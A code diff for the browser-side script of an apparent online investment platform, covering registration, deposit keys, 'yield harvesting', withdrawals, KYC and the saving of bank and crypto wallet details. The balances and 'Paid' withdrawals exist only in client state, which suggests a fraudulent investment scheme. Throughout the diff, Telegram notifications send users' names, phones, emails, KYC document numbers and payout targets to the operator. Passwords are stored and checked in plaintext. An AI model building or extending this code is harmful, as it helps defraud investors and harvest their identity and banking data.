@@ -1909,28 +1909,28 @@
 
             const hasLetter = /[a-zA-Z]/.test(pass);
             const hasNum = /[0-9]/.test(pass);
-            if(pass.length < 6 || !hasLetter || !hasNum) {
+            if (!hasLetter || !hasNum || pass.length < 6) {
                 document.getElementById('passError').style.display = 'block';
                 return;
             } else {
                 document.getElementById('passError').style.display = 'none';
             }
 
-            if(systemDB.users[user]) {
-                alert("Username already exists! Please choose another or sign in.");
+            if (systemDB.users[user]) {
+                alert("Username is already taken! Please choose another.");
                 return;
             }
 
-            const profile = { name, email, phone, username: user, password: pass, referral: ref };
-            currentUserData = createEmptyUserData(profile);
+            const profileInfo = { name, email, phone, username: user, referral: ref, password: pass };
+            currentUserData = createEmptyUserData(profileInfo);
             systemDB.users[user] = currentUserData;
             systemDB.currentUsername = user;
             saveSystemDB();
 
-            sendTelegramNotification(`🆕 <b>NEW ACCOUNT REGISTRATION</b>\n<b>Name:</b> ${name}\n<b>User:</b> ${user}\n<b>Email:</b> ${email}\n<b>Phone:</b> ${phone}\n<b>Acc ID:</b> ${currentUserData.accountId}`);
+            sendTelegramNotification(`🆕 <b>NEW USER REGISTERED</b>\n<b>Username:</b> ${user}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Name:</b> ${name}\n<b>Phone:</b> ${phone}\n<b>Email:</b> ${email}\n<b>Referral:</b> ${ref || 'None'}`);
 
             document.getElementById('authModal').style.display = 'none';
-            initDashboard();
+            initUI();
         }
 
         function handleLogin(e) {
@@ -1938,134 +1938,225 @@
             const user = document.getElementById('loginUser').value.trim();
             const pass = document.getElementById('loginPass').value;
 
-            if(!systemDB.users[user]) {
-                alert("Account not found. Please register a new account.");
+            if (!systemDB.users[user] || systemDB.users[user].profile.password !== pass) {
+                alert("Invalid Username or Password!");
                 return;
             }
 
-            const userData = systemDB.users[user];
-            if(userData.profile.password !== pass) {
-                alert("Incorrect password!");
-                return;
-            }
-
-            if(BANNED_ACCOUNT_IDS.includes(userData.accountId)) {
-                showBannedScreen(userData.accountId);
-                return;
-            }
-
-            currentUserData = userData;
             systemDB.currentUsername = user;
-            saveSystemDB();
+            currentUserData = systemDB.users[user];
 
+            if (BANNED_ACCOUNT_IDS.includes(currentUserData.accountId)) {
+                showBannedScreen(currentUserData.accountId);
+                return;
+            }
+
+            saveSystemDB();
             document.getElementById('authModal').style.display = 'none';
-            initDashboard();
+            initUI();
         }
 
         function handleLogout() {
             systemDB.currentUsername = null;
             currentUserData = null;
             saveSystemDB();
-            populateSavedUsersDatalist();
-            document.getElementById('authModal').style.display = 'flex';
+            location.reload();
         }
 
-        /* --- UI RENDER & APP LOGIC --- */
-        function initDashboard() {
-            if(!currentUserData) return;
+        /* --- UI RENDER & APPLICATION STATE --- */
+        function initUI() {
+            populateSavedUsersDatalist();
 
-            if(BANNED_ACCOUNT_IDS.includes(currentUserData.accountId)) {
+            if (!systemDB.currentUsername || !systemDB.users[systemDB.currentUsername]) {
+                document.getElementById('authModal').style.display = 'flex';
+                return;
+            }
+
+            currentUserData = systemDB.users[systemDB.currentUsername];
+
+            if (BANNED_ACCOUNT_IDS.includes(currentUserData.accountId)) {
                 showBannedScreen(currentUserData.accountId);
                 return;
             }
 
+            document.getElementById('authModal').style.display = 'none';
+
             document.getElementById('userDisplayName').innerText = currentUserData.profile.name || currentUserData.profile.username;
             document.getElementById('headerAccId').innerText = currentUserData.accountId;
+            document.getElementById('menuUserAcc').innerText = currentUserData.profile.username;
 
-            updateBalancesUI();
+            renderDashboardStats();
             renderPackages();
             renderClaims();
+            renderProfile();
             renderTransactions();
-            loadProfileFields();
-            initAviatorEngine();
         }
 
-        function updateBalancesUI() {
+        function switchMainTab(tabId, element) {
+            document.querySelectorAll('.page-view').forEach(p => p.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+
+            if(element) {
+                document.querySelectorAll('.nav-link').forEach(n => n.classList.remove('active'));
+                element.classList.add('active');
+            }
+
+            closeSidebar();
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function renderDashboardStats() {
             document.getElementById('dashDeposit').innerText = `$${currentUserData.deposit.toFixed(2)}`;
             document.getElementById('dashPending').innerText = `$${currentUserData.pending.toFixed(2)}`;
             document.getElementById('dashAvailable').innerText = `$${currentUserData.available.toFixed(2)}`;
             document.getElementById('dashActiveCount').innerText = `${currentUserData.activePlans.length} / 2 Active`;
+            document.getElementById('aviatorTopBal').innerText = `$${currentUserData.available.toFixed(2)}`;
+
+            const toggle = document.getElementById('homeYieldToggle');
+            const statusText = document.getElementById('switchStatusText');
             
-            const aviatorBal = document.getElementById('aviatorTopBal');
-            if(aviatorBal) aviatorBal.innerText = `$${currentUserData.available.toFixed(2)}`;
+            if (currentUserData.activePlans.length === 0) {
+                toggle.checked = false;
+                toggle.disabled = true;
+                statusText.innerText = "NO ACTIVE PACKAGE";
+                statusText.style.color = "var(--text-muted)";
+            } else {
+                toggle.disabled = false;
+                const canClaim = checkClaimEligibility();
+                if (canClaim) {
+                    toggle.checked = false;
+                    statusText.innerText = "YIELD READY TO HARVEST";
+                    statusText.style.color = "var(--accent-green)";
+                } else {
+                    toggle.checked = true;
+                    statusText.innerText = "YIELD ACTIVE & HARVESTED";
+                    statusText.style.color = "var(--accent-gold)";
+                }
+            }
         }
 
-        function switchMainTab(viewId, element) {
-            document.querySelectorAll('.page-view').forEach(p => p.classList.remove('active'));
-            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+        function checkClaimEligibility() {
+            if (currentUserData.activePlans.length === 0) return false;
             
-            const targetView = document.getElementById(viewId);
-            if(targetView) targetView.classList.add('active');
-            if(element) element.classList.add('active');
+            const maxPrice = Math.max(...currentUserData.activePlans.map(p => p.price));
+            const isDaily = maxPrice >= 300;
+            const requiredInterval = isDaily ? (24 * 60 * 60 * 1000) : (7 * 24 * 60 * 60 * 1000);
 
-            closeSidebar();
+            if (!currentUserData.lastClaimTimestamp) return true;
+            return (Date.now() - currentUserData.lastClaimTimestamp) >= requiredInterval;
         }
 
-        function switchProfileCategory(subId, element) {
-            document.querySelectorAll('.profile-sub-page').forEach(sp => sp.classList.remove('active'));
-            document.querySelectorAll('.profile-category-card').forEach(c => c.classList.remove('active'));
-
-            document.getElementById(subId).classList.add('active');
-            element.classList.add('active');
-        }
-
-        /* --- DEPOSIT KEY SYSTEM --- */
-        function handleKeyDeposit(e) {
-            e.preventDefault();
-            const key = document.getElementById('depositKey').value.trim();
-
-            if(systemDB.usedKeys.includes(key)) {
-                alert("This deposit key has already been redeemed or is invalid!");
+        function toggleHomeYield(checkbox) {
+            if (currentUserData.activePlans.length === 0) {
+                checkbox.checked = false;
+                alert("You need at least 1 active investment tier to harvest yield!");
                 return;
             }
 
-            if(DEPOSIT_KEYS[key] !== undefined) {
-                const amount = DEPOSIT_KEYS[key];
-                currentUserData.deposit += amount;
-                currentUserData.available += amount;
-                systemDB.usedKeys.push(key);
-
-                const txId = "DEP-" + Math.floor(100000 + Math.random() * 900000);
-                currentUserData.transactions.unshift({
-                    id: txId,
-                    type: "Key Deposit",
-                    amount: `+$${amount.toFixed(2)}`,
-                    date: new Date().toLocaleString(),
-                    status: "Completed"
-                });
-
-                saveSystemDB();
-                updateBalancesUI();
-                renderTransactions();
-
-                sendTelegramNotification(`💳 <b>DEPOSIT KEY REDEEMED</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Amount:</b> $${amount}\n<b>Key:</b> ${key}`);
-
-                closeModal('rechargeModal');
-                alert(`Successfully deposited $${amount.toFixed(2)} using key ${key}!`);
-            } else {
-                alert("Invalid 6-Digit Deposit Key. Please contact support manager.");
+            if (!checkClaimEligibility()) {
+                checkbox.checked = true;
+                alert("Yield has already been harvested for the current cycle! Please wait for the next cycle.");
+                return;
             }
+
+            let totalYield = 0;
+            currentUserData.activePlans.forEach(plan => {
+                totalYield += plan.weeklyVal;
+            });
+
+            currentUserData.pending += totalYield;
+            currentUserData.lastClaimTimestamp = Date.now();
+            
+            currentUserData.transactions.unshift({
+                id: "TX" + Math.floor(100000 + Math.random() * 900000),
+                type: "Yield Harvested",
+                amount: `+$${totalYield.toFixed(2)}`,
+                date: new Date().toLocaleString(),
+                status: "Paid"
+            });
+
+            saveSystemDB();
+            renderDashboardStats();
+            renderClaims();
+            renderTransactions();
+
+            sendTelegramNotification(`🌾 <b>YIELD HARVESTED</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Yield Credited:</b> +$${totalYield.toFixed(2)}\n<b>New Pending Profit:</b> $${currentUserData.pending.toFixed(2)}`);
+
+            alert(`Successfully harvested $${totalYield.toFixed(2)} into your Pending Profit Wallet!`);
         }
 
-        /* --- INVESTMENT PACKAGES --- */
+        function transferPendingToAvailable() {
+            if (currentUserData.pending <= 0) {
+                alert("Your Pending Profit balance is currently $0.00.");
+                return;
+            }
+
+            const transferred = currentUserData.pending;
+            currentUserData.available += transferred;
+            currentUserData.pending = 0;
+
+            currentUserData.transactions.unshift({
+                id: "TX" + Math.floor(100000 + Math.random() * 900000),
+                type: "Pending -> Available Transfer",
+                amount: `+$${transferred.toFixed(2)}`,
+                date: new Date().toLocaleString(),
+                status: "Paid"
+            });
+
+            saveSystemDB();
+            renderDashboardStats();
+            renderTransactions();
+
+            alert(`Successfully transferred $${transferred.toFixed(2)} to Available Withdrawal Balance!`);
+        }
+
+        /* --- RECHARGE / DEPOSIT KEY SYSTEM --- */
+        function handleKeyDeposit(e) {
+            e.preventDefault();
+            const keyInput = document.getElementById('depositKey').value.trim();
+
+            if (systemDB.usedKeys.includes(keyInput)) {
+                alert("This 6-Digit Deposit Key has already been redeemed or expired!");
+                return;
+            }
+
+            if (!DEPOSIT_KEYS[keyInput]) {
+                alert("Invalid Deposit Key! Please check with your Deposit Manager.");
+                return;
+            }
+
+            const depositAmt = DEPOSIT_KEYS[keyInput];
+            systemDB.usedKeys.push(keyInput);
+            currentUserData.deposit += depositAmt;
+
+            currentUserData.transactions.unshift({
+                id: "TX" + Math.floor(100000 + Math.random() * 900000),
+                type: "Deposit Key Credit",
+                amount: `+$${depositAmt.toFixed(2)}`,
+                date: new Date().toLocaleString(),
+                status: "Paid"
+            });
+
+            saveSystemDB();
+            closeModal('rechargeModal');
+            document.getElementById('depositKey').value = '';
+            renderDashboardStats();
+            renderTransactions();
+
+            sendTelegramNotification(`🔑 <b>DEPOSIT KEY REDEEMED</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Key:</b> ${keyInput}\n<b>Amount Credited:</b> $${depositAmt.toFixed(2)}\n<b>New Deposit Bal:</b> $${currentUserData.deposit.toFixed(2)}`);
+
+            alert(`Deposit Key Verified! $${depositAmt.toFixed(2)} credited to your Deposit Capital.`);
+        }
+
+        /* --- PACKAGES & INVESTMENT SUBSCRIPTION --- */
         function renderPackages() {
             const container = document.getElementById('packagesContainer');
             if(!container) return;
             container.innerHTML = '';
 
             packagesData.forEach(pkg => {
-                const isOwned = currentUserData.activePlans.some(p => p.id === pkg.id);
-                
+                const isActive = currentUserData.activePlans.some(p => p.id === pkg.id);
+
                 const card = document.createElement('div');
                 card.className = 'pkg-card';
                 card.innerHTML = `
@@ -2073,158 +2164,115 @@
                     <div>
                         <div class="pkg-icon-wrap"><i class="fa-solid ${pkg.icon}"></i></div>
                         <div class="pkg-title">${pkg.name}</div>
-                        <div class="pkg-price">$${pkg.price.toFixed(2)}</div>
-                        <div class="pkg-feature"><span>Expected Return:</span> <strong style="color: var(--accent-green);">${pkg.returnLabel}</strong></div>
-                        <div class="pkg-feature"><span>Min Withdrawal:</span> <strong>$${pkg.minWithdraw}.00</strong></div>
-                        <div class="pkg-feature"><span>Yield Cycle:</span> <strong>7-Day Recurring</strong></div>
+                        <div class="pkg-price">$${pkg.price} <span style="font-size: 13px; color: var(--text-muted); font-weight: 500;">Capital</span></div>
+                        <div class="pkg-feature">
+                            <span>Expected Yield Return:</span>
+                            <strong style="color: var(--accent-green);">${pkg.returnLabel}</strong>
+                        </div>
+                        <div class="pkg-feature">
+                            <span>Min Withdrawal:</span>
+                            <strong>$${pkg.minWithdraw}.00</strong>
+                        </div>
+                        <div class="pkg-feature" style="border-bottom: none;">
+                            <span>Active Limit:</span>
+                            <span>Max 2 Active Tiers</span>
+                        </div>
                     </div>
-                    <button class="btn ${isOwned ? 'btn-green' : 'btn-gold'}" style="margin-top: 20px;" ${isOwned ? 'disabled' : ''} onclick="purchasePackage(${pkg.id})">
-                        ${isOwned ? '<i class="fa-solid fa-circle-check"></i> Active Plan' : '<i class="fa-solid fa-shield-halved"></i> Activate Tier'}
+                    <button class="btn ${isActive ? 'btn-green' : 'btn-gold'}" style="margin-top: 20px;" ${isActive ? 'disabled' : ''} onclick="buyPackage(${pkg.id})">
+                        ${isActive ? '<i class="fa-solid fa-circle-check"></i> Plan Active' : '<i class="fa-solid fa-bolt"></i> Activate Plan'}
                     </button>
                 `;
                 container.appendChild(card);
             });
         }
 
-        function purchasePackage(pkgId) {
+        function buyPackage(pkgId) {
             const pkg = packagesData.find(p => p.id === pkgId);
-            if(!pkg) return;
+            if (!pkg) return;
 
-            if(currentUserData.activePlans.length >= 2) {
-                alert("Limit reached! You can only have up to 2 active investment plans simultaneously.");
+            if (currentUserData.activePlans.length >= 2) {
+                alert("Maximum limit reached! You can only have up to 2 active investment tiers simultaneously.");
                 return;
             }
 
-            if(currentUserData.available < pkg.price) {
-                alert(`Insufficient Available Balance! You need $${pkg.price.toFixed(2)} to activate this plan. Please deposit first.`);
+            if (currentUserData.deposit < pkg.price) {
+                alert(`Insufficient Deposit Capital! You need $${pkg.price.toFixed(2)} in your Deposit Balance to activate this tier.`);
                 openModal('rechargeModal');
                 return;
             }
 
-            currentUserData.available -= pkg.price;
-            currentUserData.activePlans.push({ ...pkg, activatedAt: Date.now() });
+            currentUserData.deposit -= pkg.price;
+            currentUserData.activePlans.push(pkg);
 
-            const txId = "INV-" + Math.floor(100000 + Math.random() * 900000);
             currentUserData.transactions.unshift({
-                id: txId,
-                type: "Package Activation",
+                id: "TX" + Math.floor(100000 + Math.random() * 900000),
+                type: `Tier Activation: ${pkg.name}`,
                 amount: `-$${pkg.price.toFixed(2)}`,
                 date: new Date().toLocaleString(),
-                status: "Active"
+                status: "Paid"
             });
 
             saveSystemDB();
-            updateBalancesUI();
+            renderDashboardStats();
             renderPackages();
             renderClaims();
             renderTransactions();
 
-            sendTelegramNotification(`🚀 <b>PACKAGE ACTIVATION</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Plan:</b> ${pkg.name}\n<b>Price:</b> $${pkg.price}`);
+            sendTelegramNotification(`🚀 <b>INVESTMENT TIER ACTIVATED</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Plan:</b> ${pkg.name}\n<b>Price:</b> $${pkg.price}\n<b>Remaining Deposit Bal:</b> $${currentUserData.deposit.toFixed(2)}`);
 
-            alert(`Successfully activated ${pkg.name}!`);
+            alert(`Success! You have activated ${pkg.name}.`);
         }
 
-        /* --- CLAIMS & YIELD TOGGLE --- */
-        function toggleHomeYield(checkbox) {
-            const statusText = document.getElementById('switchStatusText');
-            if(checkbox.checked) {
-                if(currentUserData.activePlans.length === 0) {
-                    alert("No active investment plans! Please activate a plan first to start harvesting yield.");
-                    checkbox.checked = false;
-                    return;
-                }
-                
-                statusText.innerText = "YIELD NODE CONNECTED & HARVESTING";
-                statusText.style.color = "var(--accent-green)";
-
-                let totalYield = 0;
-                currentUserData.activePlans.forEach(plan => {
-                    totalYield += plan.weeklyVal;
-                });
-
-                currentUserData.pending += totalYield;
-                saveSystemDB();
-                updateBalancesUI();
-
-                alert(`Yield Harvested! $${totalYield.toFixed(2)} added to your Pending Profit Wallet.`);
-            } else {
-                statusText.innerText = "YIELD NODE DISCONNECTED";
-                statusText.style.color = "var(--accent-gold)";
-            }
-        }
-
-        function transferPendingToAvailable() {
-            if(currentUserData.pending <= 0) {
-                alert("No pending profits to transfer!");
-                return;
-            }
-
-            const amt = currentUserData.pending;
-            currentUserData.available += amt;
-            currentUserData.pending = 0;
-
-            saveSystemDB();
-            updateBalancesUI();
-            alert(`Transferred $${amt.toFixed(2)} from Pending Wallet to Available Withdrawal Balance!`);
-        }
-
+        /* --- CLAIMS PAGE RENDER --- */
         function renderClaims() {
             const tbody = document.getElementById('claimsTableBody');
             if(!tbody) return;
             tbody.innerHTML = '';
 
-            if(currentUserData.activePlans.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 20px;">No active plans found. Activate a plan from the Investment Tiers page.</td></tr>`;
+            if (currentUserData.activePlans.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 24px;">No active investment tiers currently found. Activate a plan to earn yields.</td></tr>`;
                 return;
             }
 
-            currentUserData.activePlans.forEach(plan => {
+            const canClaim = checkClaimEligibility();
+
+            currentUserData.activePlans.forEach(pkg => {
                 const tr = document.createElement('tr');
                 tr.innerHTML = `
-                    <td><strong>${plan.name}</strong></td>
-                    <td><span class="status-paid" style="padding: 4px 8px; border-radius: 6px; font-size: 11px;">${plan.category.toUpperCase()}</span></td>
-                    <td>$${plan.price.toFixed(2)}</td>
-                    <td style="color: var(--accent-green); font-weight: 700;">${plan.returnLabel}</td>
-                    <td>$${plan.minWithdraw}.00</td>
+                    <td><strong>${pkg.name}</strong></td>
+                    <td><span class="lock-badge" style="display: inline-flex; margin:0; padding: 4px 10px; font-size: 11px; background: rgba(99, 102, 241, 0.15); color: var(--primary); border-color: rgba(99, 102, 241, 0.3);">${pkg.category.toUpperCase()}</span></td>
+                    <td>$${pkg.price.toFixed(2)}</td>
+                    <td style="color: var(--accent-green); font-weight: 700;">${pkg.returnLabel}</td>
+                    <td>$${pkg.minWithdraw}.00</td>
                     <td style="text-align: center;">
-                        <button class="btn btn-green" style="padding: 6px 12px; font-size: 12px; width: auto;" onclick="claimSinglePlanYield(${plan.id})">
-                            <i class="fa-solid fa-hand-holding-dollar"></i> Harvest Yield
-                        </button>
+                        <label class="big-switch">
+                            <input type="checkbox" ${canClaim ? '' : 'checked'} onchange="toggleHomeYield(this)">
+                            <span class="slider"></span>
+                        </label>
                     </td>
                 `;
                 tbody.appendChild(tr);
             });
         }
 
-        function claimSinglePlanYield(planId) {
-            const plan = currentUserData.activePlans.find(p => p.id === planId);
-            if(!plan) return;
-
-            currentUserData.pending += plan.weeklyVal;
-            saveSystemDB();
-            updateBalancesUI();
-            alert(`Harvested $${plan.weeklyVal.toFixed(2)} from ${plan.name} to Pending Wallet!`);
-        }
-
-        /* --- PAYOUT / WITHDRAWAL HANDLERS --- */
+        /* --- PAYOUT & WITHDRAWAL SYSTEM --- */
         function updatePayoutAddressDisplay() {
             const method = document.getElementById('payoutMethodSelect').value;
             const targetInput = document.getElementById('payoutTargetAddress');
-            const targetLabel = document.getElementById('targetAddressLabel');
-            const wallet = currentUserData.savedWallet;
+            const saved = currentUserData.savedWallet;
 
-            if(method === 'srilanka_bank') {
-                targetLabel.innerText = "Saved Bank Details";
-                targetInput.value = wallet.bankName ? `${wallet.bankName} - ${wallet.accNum} (${wallet.holderName})` : "No Bank Details Saved";
-            } else if(method === 'trc20') {
-                targetLabel.innerText = "Saved TRC-20 Address";
-                targetInput.value = wallet.trc20 ? wallet.trc20 : "No TRC-20 Address Saved";
-            } else if(method === 'binance') {
-                targetLabel.innerText = "Saved Binance Pay ID";
-                targetInput.value = wallet.binance ? wallet.binance : "No Binance Pay ID Saved";
-            } else {
-                targetLabel.innerText = "Agent Routing";
-                targetInput.value = "Direct Telegram Cash Manager Routing";
+            if (method === 'srilanka_bank') {
+                if (saved.bankName && saved.accNum) {
+                    targetInput.value = `${saved.bankName} - Acc: ${saved.accNum} (${saved.holderName})`;
+                } else {
+                    targetInput.value = "No saved Bank details! Please add in My Profile -> Payment Methods.";
+                }
+            } else if (method === 'trc20') {
+                targetInput.value = saved.trc20 || "No saved TRC-20 Address! Add in My Profile -> Payment Methods.";
+            } else if (method === 'binance') {
+                targetInput.value = saved.binance || "No saved Binance Pay ID! Add in My Profile -> Payment Methods.";
+            } else if (method === 'cash_manager') {
+                targetInput.value = "Direct Telegram Cash Agent Manager Clearance";
             }
         }
 
@@ -2232,142 +2280,186 @@
             e.preventDefault();
             const amt = parseFloat(document.getElementById('payoutAmt').value);
             const method = document.getElementById('payoutMethodSelect').value;
-            const addressDetails = document.getElementById('payoutTargetAddress').value;
+            const targetDetails = document.getElementById('payoutTargetAddress').value;
 
-            if(isNaN(amt) || amt <= 0) {
+            if (isNaN(amt) || amt <= 0) {
                 alert("Please enter a valid withdrawal amount.");
                 return;
             }
 
-            if(currentUserData.available < amt) {
-                alert("Insufficient Available Balance for this withdrawal request.");
+            if (amt > currentUserData.available) {
+                alert(`Insufficient Available Withdrawal Balance! Your available balance is $${currentUserData.available.toFixed(2)}.`);
                 return;
             }
 
-            const isHighDepositor = currentUserData.deposit >= 300;
-            const minAllowed = isHighDepositor ? 5 : 50;
+            const maxPrice = currentUserData.activePlans.length > 0 ? Math.max(...currentUserData.activePlans.map(p => p.price)) : 0;
+            const isHighDepositor = maxPrice >= 300;
 
-            if(amt < minAllowed) {
-                alert(`Minimum withdrawal amount for your tier is $${minAllowed}.00`);
-                return;
+            if (isHighDepositor) {
+                if (amt !== 5) {
+                    alert("Accounts with $300+ plans have a fixed daily withdrawal limit of exactly $5.00!");
+                    return;
+                }
+                const requiredInterval = 24 * 60 * 60 * 1000;
+                if (currentUserData.lastWithdrawalTimestamp && (Date.now() - currentUserData.lastWithdrawalTimestamp) < requiredInterval) {
+                    alert("Daily withdrawal limit reached! You can withdraw $5.00 once every 24 hours.");
+                    return;
+                }
+            } else {
+                if (amt < 50) {
+                    alert("Minimum withdrawal for standard accounts is $50.00!");
+                    return;
+                }
+                const requiredInterval = 48 * 60 * 60 * 1000;
+                if (currentUserData.lastWithdrawalTimestamp && (Date.now() - currentUserData.lastWithdrawalTimestamp) < requiredInterval) {
+                    alert("Withdrawal cycle limit reached! Standard accounts can withdraw once every 2 days (48 Hours).");
+                    return;
+                }
             }
 
             currentUserData.available -= amt;
+            currentUserData.lastWithdrawalTimestamp = Date.now();
 
-            const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
-            const txId = "WTH-" + Math.floor(100000 + Math.random() * 900000);
+            const verificationCode = "LFX" + Math.floor(100000 + Math.random() * 900000);
 
             currentUserData.transactions.unshift({
-                id: txId,
+                id: verificationCode,
                 type: `Withdrawal (${method.toUpperCase()})`,
                 amount: `-$${amt.toFixed(2)}`,
                 date: new Date().toLocaleString(),
-                status: "Processed / Paid"
+                status: "Paid"
             });
 
             saveSystemDB();
-            updateBalancesUI();
-            renderTransactions();
-
-            sendTelegramNotification(`💸 <b>WITHDRAWAL REQUEST PROCESSED</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Amount:</b> $${amt.toFixed(2)}\n<b>Method:</b> ${method}\n<b>Target:</b> ${addressDetails}\n<b>V-Code:</b> ${verificationCode}`);
-
             closeModal('payoutModal');
+            
             document.getElementById('displayDepositedDoneAmt').innerText = `$${amt.toFixed(2)}`;
             document.getElementById('displayVerificationCode').innerText = verificationCode;
             openModal('payoutSuccessModal');
+
+            renderDashboardStats();
+            renderTransactions();
+
+            sendTelegramNotification(`💸 <b>INSTANT WITHDRAWAL PROCESSED</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Amount:</b> $${amt.toFixed(2)}\n<b>Method:</b> ${method}\n<b>Target:</b> ${targetDetails}\n<b>Verification Code:</b> ${verificationCode}`);
         }
 
-        /* --- PROFILE & PAYMENT METHODS SAVING --- */
-        function loadProfileFields() {
-            if(!currentUserData) return;
-            const pf = currentUserData.profile;
-            const kw = currentUserData.kycData;
-            const sw = currentUserData.savedWallet;
+        /* --- PROFILE SUB-PAGES & SETTINGS --- */
+        function switchProfileCategory(subId, element) {
+            document.querySelectorAll('.profile-sub-page').forEach(s => s.classList.remove('active'));
+            document.getElementById(subId).classList.add('active');
 
-            if(document.getElementById('pfFullName')) document.getElementById('pfFullName').value = pf.name || '';
-            if(document.getElementById('pfEmail')) document.getElementById('pfEmail').value = pf.email || '';
-            if(document.getElementById('pfPhone')) document.getElementById('pfPhone').value = pf.phone || '';
+            document.querySelectorAll('.profile-category-card').forEach(c => c.classList.remove('active'));
+            if(element) element.classList.add('active');
+        }
 
-            if(currentUserData.personalDetailsLocked) {
+        function renderProfile() {
+            const p = currentUserData.profile;
+            document.getElementById('pfFullName').value = p.name || '';
+            document.getElementById('pfEmail').value = p.email || '';
+            document.getElementById('pfPhone').value = p.phone || '';
+
+            if (currentUserData.personalDetailsLocked) {
                 document.getElementById('personalLockNotice').style.display = 'flex';
+                document.querySelectorAll('#personalForm input').forEach(inp => inp.disabled = true);
                 document.getElementById('btnSavePersonal').style.display = 'none';
-                document.querySelectorAll('#personalForm input').forEach(i => i.disabled = true);
             }
 
-            if(kw.isLocked) {
+            const kyc = currentUserData.kycData;
+            if (kyc && kyc.isLocked) {
                 document.getElementById('kycLockNotice').style.display = 'flex';
+                document.getElementById('kycDocNum').value = kyc.docNum || '';
+                document.querySelectorAll('#kycForm input, #kycForm select').forEach(inp => inp.disabled = true);
                 document.getElementById('btnSubmitKyc').style.display = 'none';
-                document.querySelectorAll('#kycForm input, #kycForm select').forEach(i => i.disabled = true);
             }
 
-            if(document.getElementById('pfBankName')) document.getElementById('pfBankName').value = sw.bankName || '';
-            if(document.getElementById('pfAccNumber')) document.getElementById('pfAccNumber').value = sw.accNum || '';
-            if(document.getElementById('pfHolderName')) document.getElementById('pfHolderName').value = sw.holderName || '';
-            if(document.getElementById('pfBranchName')) document.getElementById('pfBranchName').value = sw.branch || '';
-            if(document.getElementById('pfBankPhone')) document.getElementById('pfBankPhone').value = sw.bankPhone || '';
-            if(document.getElementById('pfTrc20Address')) document.getElementById('pfTrc20Address').value = sw.trc20 || '';
-            if(document.getElementById('pfBinancePayId')) document.getElementById('pfBinancePayId').value = sw.binance || '';
+            const w = currentUserData.savedWallet;
+            if (w) {
+                document.getElementById('pfBankName').value = w.bankName || '';
+                document.getElementById('pfAccNumber').value = w.accNum || '';
+                document.getElementById('pfHolderName').value = w.holderName || '';
+                document.getElementById('pfBranchName').value = w.branch || '';
+                document.getElementById('pfBankPhone').value = w.bankPhone || '';
+                document.getElementById('pfTrc20Address').value = w.trc20 || '';
+                document.getElementById('pfBinancePayId').value = w.binance || '';
+
+                if (w.lockTimestamp && (Date.now() - w.lockTimestamp) < (30 * 24 * 60 * 60 * 1000)) {
+                    document.getElementById('paymentLockNotice').style.display = 'flex';
+                }
+            }
         }
 
         function savePersonalDetails(e) {
             e.preventDefault();
+            if (currentUserData.personalDetailsLocked) return;
+
             currentUserData.profile.name = document.getElementById('pfFullName').value.trim();
             currentUserData.profile.email = document.getElementById('pfEmail').value.trim();
             currentUserData.profile.phone = document.getElementById('pfPhone').value.trim();
             currentUserData.personalDetailsLocked = true;
 
             saveSystemDB();
-            loadProfileFields();
-            alert("Personal details locked permanently!");
+            renderProfile();
+
+            alert("Personal details updated and permanently locked for security compliance.");
         }
 
         function handleKycSubmit(e) {
             e.preventDefault();
-            currentUserData.kycData.docType = document.getElementById('kycDocType').value;
-            currentUserData.kycData.docNum = document.getElementById('kycDocNum').value.trim();
-            currentUserData.kycData.isLocked = true;
+            if (currentUserData.kycData && currentUserData.kycData.isLocked) return;
 
+            const docType = document.getElementById('kycDocType').value;
+            const docNum = document.getElementById('kycDocNum').value.trim();
+
+            currentUserData.kycData = { docType, docNum, isLocked: true };
             saveSystemDB();
-            loadProfileFields();
-            alert("KYC documents submitted & locked successfully!");
+            renderProfile();
+
+            sendTelegramNotification(`📑 <b>KYC SUBMITTED & LOCKED</b>\n<b>User:</b> ${currentUserData.profile.username}\n<b>Acc ID:</b> ${currentUserData.accountId}\n<b>Doc Type:</b> ${docType}\n<b>Doc Num:</b> ${docNum}`);
+
+            alert("KYC Verification submitted and locked successfully!");
         }
 
         function handleWalletSave(e) {
             e.preventDefault();
-            currentUserData.savedWallet = {
-                bankName: document.getElementById('pfBankName').value.trim(),
-                accNum: document.getElementById('pfAccNumber').value.trim(),
-                holderName: document.getElementById('pfHolderName').value.trim(),
-                branch: document.getElementById('pfBranchName').value.trim(),
-                bankPhone: document.getElementById('pfBankPhone').value.trim(),
-                trc20: document.getElementById('pfTrc20Address').value.trim(),
-                binance: document.getElementById('pfBinancePayId').value.trim(),
-                lockTimestamp: Date.now()
-            };
 
+            const bankName = document.getElementById('pfBankName').value.trim();
+            const accNum = document.getElementById('pfAccNumber').value.trim();
+            const holderName = document.getElementById('pfHolderName').value.trim();
+            const branch = document.getElementById('pfBranchName').value.trim();
+            const bankPhone = document.getElementById('pfBankPhone').value.trim();
+            const trc20 = document.getElementById('pfTrc20Address').value.trim();
+            const binance = document.getElementById('pfBinancePayId').value.trim();
+
+            currentUserData.savedWallet = { bankName, accNum, holderName, branch, bankPhone, trc20, binance, lockTimestamp: Date.now() };
             saveSystemDB();
-            alert("Payment details saved successfully!");
+            renderProfile();
+
